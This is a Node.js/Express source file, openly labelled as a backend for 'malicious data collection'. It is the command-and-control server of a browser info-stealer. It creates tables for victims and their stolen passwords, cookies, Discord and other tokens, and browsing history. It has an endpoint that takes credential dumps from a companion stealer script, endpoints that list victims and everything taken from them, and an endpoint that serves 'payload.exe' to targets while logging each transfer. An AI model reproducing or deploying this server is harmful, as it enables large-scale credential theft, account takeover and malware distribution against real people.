/**
 * Backend Server for Malicious Data Collection
 * - Receives JSON data and stores in Aiven Cloud MySQL Database
 * - Handles file transfers (exe files)
 */

const express = require('express');
const mysql = require('mysql2/promise');
const multer = require('multer');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();

// Trust proxy for DigitalOcean App Platform
app.set('trust proxy', true);

// Middleware
app.use(helmet()); // Security headers
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Database configuration from .env (MySQL/Aiven)
const dbConfig = {
    host: process.env.DB_HOST,
    port: parseInt(process.env.DB_PORT) || 21011,
    user: process.env.DB_USER,
    password: process.env.DB_PASSWORD,
    database: process.env.DB_NAME,
    ssl: {
        rejectUnauthorized: false
    }
};

// Server configuration
const PORT = parseInt(process.env.PORT) || 5000;

// Directory for storing executable files
const FILES_DIR = path.join(__dirname, 'files');

// Ensure files directory exists
if (!fs.existsSync(FILES_DIR)) {
    fs.mkdirSync(FILES_DIR, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, FILES_DIR);
    },
    filename: (req, file, cb) => {
        cb(null, file.originalname);
    }
});
const upload = multer({ storage });

// Database connection pool
let pool;
let dbConnected = false;
let mockStorageEnabled = false;
let mockData = [];

/**
 * Create and return a database connection pool
 */
async function createPool() {
    try {
        pool = mysql.createPool(dbConfig);
        console.log('[✓] Database pool created successfully');
        dbConnected = true;
        mockStorageEnabled = false;
        return pool;
    } catch (error) {
        console.error(`[✗] Database connection error: ${error.message}`);
        console.error('[!] Falling back to mock storage');
        dbConnected = false;
        mockStorageEnabled = true;
        return null;
    }
}

/**
 * Get a connection from the pool
 */
async function getDbConnection() {
    if (!pool || !dbConnected) {
        throw new Error('Database not available');
    }
    return pool.getConnection();
}

/**
 * Initialize database tables if they don't exist
 */
async function initDatabase() {
    if (!dbConnected) {
        console.log('[!] Database not connected, skipping table initialization');
        return;
    }
    
    try {
        const conn = await getDbConnection();
        
        // Create table for storing received data
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS received_data (
                id INT AUTO_INCREMENT PRIMARY KEY,
                data JSON NOT NULL,
                source_ip VARCHAR(50),
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_type VARCHAR(100)
            )
        `);
        
        // Create table for file transfer logs
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS file_transfers (
                id INT AUTO_INCREMENT PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                target_ip VARCHAR(50),
                transferred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status VARCHAR(50) DEFAULT 'pending'
            )
        `);
        
        // ========== BROWSER CREDENTIALS TABLES ==========
        
        // Table for victim system information
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS victims (
                id INT AUTO_INCREMENT PRIMARY KEY,
                hostname VARCHAR(255),
                os VARCHAR(100),
                os_version VARCHAR(255),
                architecture VARCHAR(50),
                username VARCHAR(255),
                source_ip VARCHAR(50),
                first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
                UNIQUE KEY unique_victim (hostname, username)
            )
        `);
        
        // Table for stolen passwords
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS stolen_passwords (
                id INT AUTO_INCREMENT PRIMARY KEY,
                victim_id INT NOT NULL,
                browser VARCHAR(100),
                origin_url TEXT,
                action_url TEXT,
                username VARCHAR(500),
                password VARCHAR(500),
                date_created VARCHAR(100),
                date_last_used VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
                INDEX idx_victim (victim_id),
                INDEX idx_browser (browser)
            )
        `);
        
        // Table for stolen cookies
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS stolen_cookies (
                id INT AUTO_INCREMENT PRIMARY KEY,
                victim_id INT NOT NULL,
                browser VARCHAR(100),
                host VARCHAR(500),
                name VARCHAR(255),
                value TEXT,
                path VARCHAR(500),
                expires VARCHAR(100),
                is_secure BOOLEAN DEFAULT FALSE,
                is_httponly BOOLEAN DEFAULT FALSE,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
                INDEX idx_victim (victim_id),
                INDEX idx_host (host(255))
            )
        `);
        
        // Table for stolen tokens (Discord, etc.)
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS stolen_tokens (
                id INT AUTO_INCREMENT PRIMARY KEY,
                victim_id INT NOT NULL,
                token_type VARCHAR(100),
                token TEXT,
                source VARCHAR(500),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
                INDEX idx_victim (victim_id),
                INDEX idx_type (token_type)
            )
        `);
        
        // Table for browser history
        await conn.execute(`
            CREATE TABLE IF NOT EXISTS stolen_history (
                id INT AUTO_INCREMENT PRIMARY KEY,
                victim_id INT NOT NULL,
                browser VARCHAR(100),
                url TEXT,
                title TEXT,
                visit_count INT DEFAULT 0,
                last_visit VARCHAR(100),
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(id) ON DELETE CASCADE,
                INDEX idx_victim (victim_id)
            )
        `);
        
        conn.release();
        console.log('[✓] Database tables initialized successfully');
    } catch (error) {
        console.error(`[✗] Database initialization error: ${error.message}`);
        // Don't throw, just log and continue with mock storage
        dbConnected = false;
        mockStorageEnabled = true;
    }
}

// ==================== DATA RECEIVING ENDPOINTS ====================

/**
 * Endpoint to receive JSON data and store in database
 * Expected: JSON body with any structure
 */
app.post('/api/receive', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data || Object.keys(data).length === 0) {
            return res.status(400).json({ error: 'No data provided' });
        }
        
        // Get client IP
        const sourceIp = req.ip || req.connection.remoteAddress;
        
        // Get optional data type from query params
        const dataType = req.query.type || 'general';
        
        const dataSize = JSON.stringify(data).length;
        console.log(`[*] Received data from ${sourceIp}, type: ${dataType}, size: ${dataSize} bytes`);
        
        let recordId = null;
        
        if (dbConnected && pool) {
            // Store in database
            const conn = await getDbConnection();
            
            try {
                const [result] = await conn.execute(
                    `INSERT INTO received_data (data, source_ip, data_type, received_at)
                     VALUES (?, ?, ?, ?)`,
                    [JSON.stringify(data), sourceIp, dataType, new Date()]
                );
                
                recordId = result.insertId;
                conn.release();
                console.log(`[✓] Data stored in database with ID: ${recordId}`);
                
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database insert error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            // Use mock storage
            recordId = mockData.length + 1;
            mockData.push({
                id: recordId,
                data: data,
                source_ip: sourceIp,
                data_type: dataType,
                received_at: new Date()
            });
            console.log(`[✓] Data stored in mock storage with ID: ${recordId}`);
        }
        
        return res.status(201).json({
            status: 'success',
            message: 'Data received and stored',
            id: recordId,
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving data: ${error.message}`);
        console.error(`[✗] Stack: ${error.stack}`);
        return res.status(500).json({ 
            error: error.message || 'Internal server error',
            details: error.code || error.errno || 'Unknown error',
            type: error.constructor.name
        });
    }
});

/**
 * Endpoint to receive multiple JSON records at once
 * Expected: JSON array of objects
 */
app.post('/api/receive/batch', async (req, res) => {
    try {
        const dataList = req.body;
        
        if (!Array.isArray(dataList)) {
            return res.status(400).json({ error: 'Expected JSON array' });
        }
        
        const sourceIp = req.ip || req.connection.remoteAddress;
        const dataType = req.query.type || 'batch';
        
        console.log(`[*] Received batch from ${sourceIp}, records: ${dataList.length}`);
        
        const insertedIds = [];
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            try {
                for (const data of dataList) {
                    const [result] = await conn.execute(
                        `INSERT INTO received_data (data, source_ip, data_type, received_at)
                         VALUES (?, ?, ?, ?)`,
                        [JSON.stringify(data), sourceIp, dataType, new Date()]
                    );
                    insertedIds.push(result.insertId);
                }
                
                conn.release();
                console.log(`[✓] Batch stored in database: ${insertedIds.length} records`);
                
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database batch insert error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            // Use mock storage
            for (const data of dataList) {
                const id = mockData.length + 1;
                mockData.push({
                    id: id,
                    data: data,
                    source_ip: sourceIp,
                    data_type: dataType,
                    received_at: new Date()
                });
                insertedIds.push(id);
            }
            console.log(`[✓] Batch stored in mock storage: ${insertedIds.length} records`);
        }
        
        return res.status(201).json({
            status: 'success',
            message: `${insertedIds.length} records stored`,
            ids: insertedIds,
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving batch data: ${error.message}`);
        return res.status(500).json({ 
            error: error.message || 'Internal server error',
            details: error.code || 'Unknown error'
        });
    }
});

// ==================== BROWSER CREDENTIALS ENDPOINT ====================

/**
 * Endpoint to receive browser credentials from tokenAccess.py
 * Creates/updates victim and stores all extracted data
 */
app.post('/api/credentials', async (req, res) => {
    try {
        const data = req.body;
        
        if (!data || !data.system_info) {
            return res.status(400).json({ error: 'Invalid data format - missing system_info' });
        }
        
        const sourceIp = req.ip || req.connection.remoteAddress;
        const systemInfo = data.system_info;
        
        console.log(`[*] Received credentials from ${systemInfo.hostname} (${sourceIp})`);
        
        let victimId = null;
        let stats = { passwords: 0, cookies: 0, tokens: 0, history: 0 };
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            try {
                // Insert or update victim
                await conn.execute(`
                    INSERT INTO victims (hostname, os, os_version, architecture, username, source_ip)
                    VALUES (?, ?, ?, ?, ?, ?)
                    ON DUPLICATE KEY UPDATE 
                        os = VALUES(os),
                        os_version = VALUES(os_version),
                        source_ip = VALUES(source_ip),
                        last_seen = CURRENT_TIMESTAMP
                `, [
                    systemInfo.hostname,
                    systemInfo.os,
                    systemInfo.os_version,
                    systemInfo.architecture,
                    systemInfo.username,
                    sourceIp
                ]);
                
                // Get victim ID
                const [victimRows] = await conn.execute(
                    'SELECT id FROM victims WHERE hostname = ? AND username = ?',
                    [systemInfo.hostname, systemInfo.username]
                );
                victimId = victimRows[0].id;
                
                // Insert passwords
                if (data.passwords && data.passwords.data) {
                    for (const pwd of data.passwords.data) {
                        await conn.execute(`
                            INSERT INTO stolen_passwords 
                            (victim_id, browser, origin_url, action_url, username, password, date_created, date_last_used)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                        `, [
                            victimId,
                            pwd.browser || 'Unknown',
                            pwd.origin_url || pwd.hostname || '',
                            pwd.action_url || pwd.form_submit_url || '',
                            pwd.username || '',
                            pwd.password || '',
                            pwd.date_created || pwd.time_created || '',
                            pwd.date_last_used || pwd.time_last_used || ''
                        ]);
                        stats.passwords++;
                    }
                }
                
                // Insert cookies (limit to prevent overflow)
                if (data.cookies && data.cookies.data) {
                    const cookiesToInsert = data.cookies.data.slice(0, 500);
                    for (const cookie of cookiesToInsert) {
                        await conn.execute(`
                            INSERT INTO stolen_cookies 
                            (victim_id, browser, host, name, value, path, expires, is_secure, is_httponly)
                            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                        `, [
                            victimId,
                            cookie.browser || 'Unknown',
                            cookie.host || '',
                            cookie.name || '',
                            cookie.value || '',
                            cookie.path || '',
                            cookie.expires || '',
                            cookie.is_secure ? 1 : 0,
                            cookie.is_httponly ? 1 : 0
                        ]);
                        stats.cookies++;
                    }
                }
                
                // Insert tokens
                if (data.tokens && data.tokens.data) {
                    for (const token of data.tokens.data) {
                        await conn.execute(`
                            INSERT INTO stolen_tokens 
                            (victim_id, token_type, token, source)
                            VALUES (?, ?, ?, ?)
                        `, [
                            victimId,
                            token.type || 'unknown',
                            token.token || '',
                            token.source || ''
                        ]);
                        stats.tokens++;
                    }
                }
                
                // Insert history (limit to prevent overflow)
                if (data.history && data.history.data) {
                    const historyToInsert = data.history.data.slice(0, 500);
                    for (const entry of historyToInsert) {
                        await conn.execute(`
                            INSERT INTO stolen_history 
                            (victim_id, browser, url, title, visit_count, last_visit)
                            VALUES (?, ?, ?, ?, ?, ?)
                        `, [
                            victimId,
                            entry.browser || 'Unknown',
                            entry.url || '',
                            entry.title || '',
                            entry.visit_count || 0,
                            entry.last_visit || ''
                        ]);
                        stats.history++;
                    }
                }
                
                conn.release();
                
                console.log(`[✓] Stored credentials for victim ID ${victimId}:`);
                console.log(`    Passwords: ${stats.passwords}, Cookies: ${stats.cookies}, Tokens: ${stats.tokens}, History: ${stats.history}`);
                
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            // Mock storage fallback
            victimId = mockData.length + 1;
            mockData.push({
                id: victimId,
                type: 'credentials',
                data: data,
                source_ip: sourceIp,
                received_at: new Date()
            });
            stats = {
                passwords: data.passwords?.total_count || 0,
                cookies: data.cookies?.total_count || 0,
                tokens: data.tokens?.total_count || 0,
                history: data.history?.total_count || 0
            };
            console.log(`[✓] Stored in mock storage with ID: ${victimId}`);
        }
        
        return res.status(201).json({
            status: 'success',
            message: 'Credentials received and stored',
            victim_id: victimId,
            stats: stats,
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error receiving credentials: ${error.message}`);
        return res.status(500).json({ 
            error: error.message || 'Internal server error',
            details: error.code || 'Unknown error'
        });
    }
});

/**
 * Endpoint to get all victims
 */
app.get('/api/victims', async (req, res) => {
    try {
        if (!dbConnected || !pool) {
            return res.status(200).json({ 
                victims: mockData.filter(d => d.type === 'credentials'),
                storage: 'memory'
            });
        }
        
        const conn = await getDbConnection();
        
        const [victims] = await conn.execute(`
            SELECT v.*, 
                   (SELECT COUNT(*) FROM stolen_passwords WHERE victim_id = v.id) as password_count,
                   (SELECT COUNT(*) FROM stolen_cookies WHERE victim_id = v.id) as cookie_count,
                   (SELECT COUNT(*) FROM stolen_tokens WHERE victim_id = v.id) as token_count,
                   (SELECT COUNT(*) FROM stolen_history WHERE victim_id = v.id) as history_count
            FROM victims v
            ORDER BY v.last_seen DESC
        `);
        
        conn.release();
        
        return res.status(200).json({ victims, count: victims.length });
        
    } catch (error) {
        console.error(`[✗] Error getting victims: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to get victim details with all stolen data
 */
app.get('/api/victims/:id', async (req, res) => {
    try {
        const victimId = req.params.id;
        
        if (!dbConnected || !pool) {
            const victim = mockData.find(d => d.id == victimId && d.type === 'credentials');
            return res.status(200).json({ victim: victim || null, storage: 'memory' });
        }
        
        const conn = await getDbConnection();
        
        // Get victim info
        const [victims] = await conn.execute('SELECT * FROM victims WHERE id = ?', [victimId]);
        
        if (victims.length === 0) {
            conn.release();
            return res.status(404).json({ error: 'Victim not found' });
        }
        
        // Get all related data
        const [passwords] = await conn.execute('SELECT * FROM stolen_passwords WHERE victim_id = ?', [victimId]);
        const [cookies] = await conn.execute('SELECT * FROM stolen_cookies WHERE victim_id = ? LIMIT 100', [victimId]);
        const [tokens] = await conn.execute('SELECT * FROM stolen_tokens WHERE victim_id = ?', [victimId]);
        const [history] = await conn.execute('SELECT * FROM stolen_history WHERE victim_id = ? LIMIT 100', [victimId]);
        
        conn.release();
        
        return res.status(200).json({
            victim: victims[0],
            passwords: { data: passwords, count: passwords.length },
            cookies: { data: cookies, count: cookies.length },
            tokens: { data: tokens, count: tokens.length },
            history: { data: history, count: history.length }
        });
        
    } catch (error) {
        console.error(`[✗] Error getting victim details: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== FILE TRANSFER ENDPOINTS ====================

/**
 * Endpoint to transfer executable file to client
 * Query params: filename (optional, defaults to payload.exe)
 */
app.get('/api/transfer/file', async (req, res) => {
    try {
        const filename = req.query.filename || 'payload.exe';
        const filePath = path.join(FILES_DIR, filename);
        
        if (!fs.existsSync(filePath)) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        // Log the transfer
        const targetIp = req.ip || req.connection.remoteAddress;
        
        const conn = await getDbConnection();
        
        await conn.execute(
            `INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
             VALUES (?, ?, ?, ?)`,
            [filename, targetIp, 'completed', new Date()]
        );
        
        conn.release();
        
        console.log(`[*] File '${filename}' transferred to ${targetIp}`);
        
        return res.download(filePath, filename);
        
    } catch (error) {
        console.error(`[✗] Error transferring file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

/**
 * Endpoint to upload files to server (for later distribution)
 */
app.post('/api/transfer/upload', upload.single('file'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: 'No file provided' });
        }
        
        console.log(`[*] File '${req.file.originalname}' uploaded successfully`);
        
        return res.status(201).json({
            status: 'success',
            message: 'File uploaded',
            filename: req.file.originalname
        });
        
    } catch (error) {
        console.error(`[✗] Error uploading file: ${error.message}`);
        return res.status(500).json({ error: error.message });
    }
});

// ==================== UTILITY ENDPOINTS ====================

/**
 * Health check endpoint
 */
app.get('/api/health', async (req, res) => {
    try {
        let dbStatus = 'disconnected';
        
        if (dbConnected && pool) {
            try {
                const conn = await getDbConnection();
                await conn.execute('SELECT 1');
                conn.release();
                dbStatus = 'connected';
            } catch (error) {
                dbStatus = 'connection_error';
            }
        } else if (mockStorageEnabled) {
            dbStatus = 'using_mock_storage';
        }
        
        return res.status(200).json({
            status: 'healthy',
            database: dbStatus,
            mockStorage: mockStorageEnabled,
            mockDataCount: mockData.length,
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        return res.status(500).json({
            status: 'unhealthy',
            database: 'error',
            error: error.message
        });
    }
});

/**
 * Retrieve all stored data (for testing/admin purposes)
 */
app.get('/api/data', async (req, res) => {
    try {
        let data = [];
        
        if (dbConnected && pool) {
            const conn = await getDbConnection();
            
            try {
                const [rows] = await conn.execute(`
                    SELECT id, data, source_ip, data_type, received_at 
                    FROM received_data 
                    ORDER BY received_at DESC
                    LIMIT 100
                `);
                
                conn.release();
                
                data = rows.map(row => ({
                    id: row.id,
                    data: typeof row.data === 'string' ? JSON.parse(row.data) : row.data,
                    source_ip: row.source_ip,
                    data_type: row.data_type,
                    received_at: row.received_at ? row.received_at.toISOString() : null
                }));
            } catch (dbError) {
                conn.release();
                console.error(`[✗] Database retrieval error: ${dbError.message}`);
                throw dbError;
            }
        } else {
            // Return mock data
            data = mockData.map(item => ({
                id: item.id,
                data: item.data,
                source_ip: item.source_ip,
                data_type: item.data_type,
                received_at: item.received_at.toISOString()
            })).reverse().slice(0, 100);
        }
        
        return res.status(200).json({ 
            data, 
            count: data.length,
            storage: dbConnected ? 'database' : 'memory'
        });
        
    } catch (error) {
        console.error(`[✗] Error retrieving data: ${error.message}`);
        return res.status(500).json({ 
            error: error.message,
            details: error.code || 'Unknown error'
        });
    }
});

/**
 * Root endpoint
 */
app.get('/', (req, res) => {
    return res.status(200).json({
        message: 'Backend Server Running',
        endpoints: {
            receive_data: 'POST /api/receive',
            receive_batch: 'POST /api/receive/batch',
            credentials: 'POST /api/credentials',
            victims_list: 'GET /api/victims',
            victim_details: 'GET /api/victims/:id',
            transfer_file: 'GET /api/transfer/file?filename=<name>',
            upload_file: 'POST /api/transfer/upload',
            health_check: 'GET /api/health',
            get_data: 'GET /api/data'
        }
    });
});

// ==================== SERVER STARTUP ====================

async function startServer() {
    console.log(`
    ╔═══════════════════════════════════════════════════════════╗
    ║           Backend Server - Data Collection                ║
    ║                    (Node.js/Express)                      ║
    ║                                                           ║
    ║  Endpoints:                                               ║
    ║  • POST /api/receive       - Receive JSON data            ║
    ║  • POST /api/receive/batch - Receive batch JSON data      ║
    ║  • POST /api/credentials   - Receive browser credentials  ║
    ║  • GET  /api/victims       - List all victims             ║
    ║  • GET  /api/victims/:id   - Get victim details           ║
    ║  • GET  /api/transfer/file - Download file                ║
    ║  • POST /api/transfer/upload - Upload file                ║
    ║  • GET  /api/health        - Health check                 ║
    ║  • GET  /api/data          - View stored data             ║
    ╚═══════════════════════════════════════════════════════════╝
    `);
    
    // Initialize database (with fallback to mock storage)
    try {
        await createPool();
        await initDatabase();
    } catch (error) {
        console.log(`[!] Warning: Could not initialize database: ${error.message}`);
        console.log('[!] Using mock in-memory storage');
        mockStorageEnabled = true;
    }
    
    // Start server
    app.listen(PORT, '0.0.0.0', () => {
        console.log(`[*] Starting server on http://0.0.0.0:${PORT}`);
        console.log(`[*] Storage mode: ${dbConnected ? 'DATABASE' : 'MOCK (In-Memory)'}`);
        console.log('[*] Press Ctrl+C to stop the server\n');
    });
}

// Start the server
startServer();

// Graceful shutdown
process.on('SIGTERM', async () => {
    console.log('[*] SIGTERM received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

process.on('SIGINT', async () => {
    console.log('[*] SIGINT received. Shutting down gracefully...');
    if (pool) {
        await pool.end();
        console.log('[*] Database pool closed.');
    }
    process.exit(0);
});

module.exports = { app, initDatabase, PORT, FILES_DIR };
